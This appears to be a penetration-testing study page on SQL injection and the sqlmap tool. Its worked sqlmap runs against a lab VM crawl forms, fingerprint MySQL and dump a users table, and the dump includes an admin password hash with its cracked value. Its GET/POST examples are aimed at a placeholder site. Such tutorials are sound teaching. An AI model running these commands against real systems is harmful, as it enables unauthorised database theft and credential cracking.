.. include:: /pentest_links.txt


*************
`sqlmap`_ 
*************

SQL injection
=============

From `Wikipedia SQL injection <https://en.wikipedia.org/wiki/SQL_injection>`_:

  SQL injection is a code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).[1] SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.
  
See `Bobby Tables: A guide to preventing SQL injection <http://bobby-tables.com/>`_. To secure a database against SQL injection you should use only prepared SQL statements, turn off DBMS error reports, and use the least privileged account. Do not use your own custom code as these are subject to mistakes.

`sqlmap`_ intro
===============

``sqlmap`` is a Python program supporting both SQL injection and direct database connection. ``sqlmap`` can exploit a database and interact with the file and operating systems. Exploiting a database can include reading data (including passwords), determining database structure, modifying the database including stored procedures, and replicating a local copy of the data. Interacting with the file system can include uploading, downloading, and modifying files. Interacting with the operating systems can include running arbitratry commands. The functionality is highly dependent on the DBMS involved.

Consult the `sqlmap wiki`_ for an introduction. `sqlmap techniques <https://github.com/sqlmapproject/sqlmap/wiki/Techniques>`_ summarizes the 5 different SQL injection types supported by ``sqlmap``. Note that the structure of the database application determines the possible injection types. For example, the *UNION query-based* type works for "the output of the ``SELECT`` statement within a ``for`` loop, or similar, ...".

From `sqlmap wiki features <https://github.com/sqlmapproject/sqlmap/wiki>`_:

  ``sqlmap`` "generic features" describes much of what you expect from SQL injection. It has "Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB database management systems." It not only supports SQL injection but also direct connection to the database. And it can "replicate the back-end database tables structure and entries on a local SQLite 3 database."

  ``sqlmap`` "fingerprint and enumeration features" not only can fingerprint the database and operating systems, but also determine the database structure.
  
  ``sqlmap`` "takeover features" can download/upload files, execute arbitrary commands and retrieve their output, and in-memory execution of Metasploit shellcode. These are available in some versions of MySQL, PostgreSQL, and Microsoft SQL Server.


`sqlmap`_ examples
==================

One way to study `sqlmap`_ is to run ``sqlmap --help`` and study arguments by group. We'll do that here using as a target the VM in :ref:`PentesterLabSQLi2Shell`.

General & Miscellaneous
-----------------------

use ``--output-dir $PWD/sqlmap``
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The preferred way to use `sqlmap`_ is to explicitly specify the output directory as a fully qualified path, usually based on $PWD: ``sqlmap --output-dir $PWD/sqlmap``.

Different `sqlmap`_ versions run via ``sudo`` have defaulted to */root/.sqlmap/output/* or */usr/share/sqlmap/output/*, and otherwise either *~/.sqlmap/output/* or */tmp/sqlmapoutput??????* (?????? a random 6 digit string). The */tmp/sqlmapoutput??????* is especially bad as `sqlmap`_ saves results that can be re-used, so choosing a different subdirectory of */tmp/* for each `sqlmap`_ run forces recomputation of these results. So avoid all this and just specify ``--output-dir $PWD/sqlmap``.

To clean up the default directory locations run ``sqlmap --purge-output`` and ``sudo sqlmap --purge-output``. This is especially important when running multiple pentest challenges having the same target IP:


use ``--batch`` and ``--answers=ANSWERS`` to override
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

`sqlmap`_ runtime questions can be answered automatically via ``--batch`` (takes the default answers), follwed by ``--answers=ANSWERS`` to override selected default answers. Choose a unique word or phrase for each question and be wary of choosing something that appears in several questions as it will match all those questions. Consider the following three questions:

* custom injection marking character ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y

* (custom) HEADER parameter 'X-Forwarded-For #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

* do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y

Suppose you want all defaults except the last question; choosing ``--batch --answers="want=N"`` will actually answer "N" to all three questions because "want" appears in all three questions. Instead, choosing ``--batch --answers="optimize=N"`` will override only the last question, as desired.

.. _sqlmap-forms-crawl:

``--forms`` with ``crawl=CRAWLDEPTH``
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

You don't have to manually search all pages for SQL injectable forms when `sqlmap`_ will do it for you.

.. code-block:: console

  hacker@kali:~$ TARGET=192.168.1.104
  hacker@kali:~$ rm -rf sqlmap/
  hacker@kali:~$ sqlmap -u "http://$TARGET/" --forms --crawl=2  --dbs \
      --batch --output $PWD/sqlmap
  ###################### SNIP ######################
  [12:21:16] [INFO] starting crawler
  ###################### SNIP ######################
  [12:21:16] [INFO] sqlmap got a total of 7 targets                                                
  [#1] form:
  POST http://192.168.1.104:80/admin/index.php
  POST data: user=&password=
  do you want to test this form? [Y/n/q] 
  > Y
  ###################### SNIP ######################
  [#2] form:
  GET http://192.168.1.104:80/cat.php?id=1
  do you want to test this form? [Y/n/q] 
  > Y
  ###################### SNIP ######################
  GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
  ###################### SNIP ######################
  do you want to exploit this SQL injection? [Y/n] Y
  [12:21:47] [INFO] the back-end DBMS is MySQL
  web server operating system: Linux Debian 6.0 (squeeze)
  web application technology: PHP 5.3.3, Apache 2.2.16
  back-end DBMS: MySQL 5.0
  [12:21:47] [INFO] fetching database names
  available databases [2]:
  [*] information_schema
  [*] photoblog
  ###################### SNIP ######################


Enumeration & Fingerprint
-------------------------

use ``--banner`` and ``--fingerprint``
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

To get basic service information use ``--banner`` and ``--fingerprint``:

.. code-block:: console

  hacker@kali:~$ TARGET=192.168.1.104
  hacker@kali:~$ rm -rf sqlmap/
  hacker@kali:~$ sqlmap -u "http://$TARGET/cat.php?id=1"  --fingerprint --banner \
      --batch --output $PWD/sqlmap
  ###################### SNIP ######################
  [12:54:07] [INFO] fetching banner
  [12:54:07] [INFO] actively fingerprinting MySQL
  [12:54:07] [INFO] executing MySQL comment injection fingerprint
  web server operating system: Linux Debian 6.0 (squeeze)
  web application technology: PHP 5.3.3, Apache 2.2.16
  back-end DBMS: active fingerprint: MySQL >= 5.1.12 and < 5.5.0
                 banner parsing fingerprint: MySQL 5.1.63
                 html error message fingerprint: MySQL
  banner:    '5.1.63-0+squeeze1'
  ###################### SNIP ######################


use ``--dbs``, ``-D DATABASE --tables``, ``-D DATABASE -T TABLE --dump``
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Once you figure out the dbms, you can move through ``-dbs`` to enumerate databases, ``-D DATABASE --tables`` to enumerate tables in the database, and finally ``-D DATABASE -T TABLE --dump`` to dump the selected table. Here it goes one step forward and cracks a password in the dumped table:

.. code-block:: console

  hacker@kali:~$ TARGET=192.168.1.104
  hacker@kali:~$ sqlmap -u "http://$TARGET/cat.php?id=1"  \
      --fingerprint -D photoblog -T users --dump  --batch --output $PWD/sqlmap
  ###################### SNIP ######################
  Database: photoblog
  Table: users
  [1 entry]
  +----+-------+---------------------------------------------+
  | id | login | password                                    |
  +----+-------+---------------------------------------------+
  | 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
  +----+-------+---------------------------------------------+


``--level``, ``--risk`` and ``-p``, ``--skip`` control injection points
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

From ``sqlmap --help``:

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (0-3, default 1)

The actual tests performed are in the file *xml/payloads.xml*, a difficult to read and understand file (to say the least). Informally, `sqlmap usage <https://github.com/sqlmapproject/sqlmap/wiki/Usage>`_ states:

  By default sqlmap tests all GET parameters and POST parameters. When the value of --level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on value of --level too. 

  For instance, to test for GET parameter id and for HTTP User-Agent only, provide -p "id,user-agent".

  In case that user wants to exclude certain parameters from testing, he can use option --skip. That is especially useful in cases when you want to use higher value for --level and test all available parameters excluding some of HTTP headers normally being tested.

  For instance, to skip testing for HTTP header User-Agent and HTTP header Referer at --level=5, provide --skip="user-agent,referer".

And for risk it states:

  This option requires an argument which specifies the risk of tests to perform. There are four risk values. The default value is 1 which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also OR-based SQL injection tests.

  In some instances, like a SQL injection in an UPDATE statement, injecting an OR-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this option has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous option, the payloads used by sqlmap are specified in the textual file xml/payloads.xml and you are free to edit and add your owns.



Request
-------


HTTP GET vs POST
^^^^^^^^^^^^^^^^

Injection points are often in either GET or POST forms and `sqlmap`_ handles both. All `sqlmap`_ runs must specify a url using one of the following (but usually ``-u`` or ``-url``):

  -d DIRECT           Direct connection to the database
  -u URL, --url=URL   Target URL (e.g. "www.target.com/vuln.php?id=1")
  -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
  -m BULKFILE         Scan multiple targets enlisted in a given textual file
  -r REQUESTFILE      Load HTTP request from a file
  -g GOOGLEDORK       Process Google dork results as target URLs
  -c CONFIGFILE       Load options from a configuration INI file

POST requests additionally use the ``--data`` option to specify POST parameters.

  --data=DATA         Data string to be sent through POST
  --param-del=PDEL    Character used for splitting parameter values

Here is are examples of a GET and POST requests. Note that you can avoid using ``--data`` by using the ``-forms`` option to automatically parse the form data (see :ref:`sqlmap-forms-crawl`).

.. code-block:: bash

  # GET
  python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f \
      --banner --dbs --users
  # POST
  python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f \
      --banner --dbs --users
  # POST with --param-del to avoid ampersand character
  python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" \
      --param-del=";" -f --banner --dbs --users
  # POST using --forms
  python sqlmap.py -u "http://www.target.com/vuln.php" --forms -f --banner \
      --dbs --users
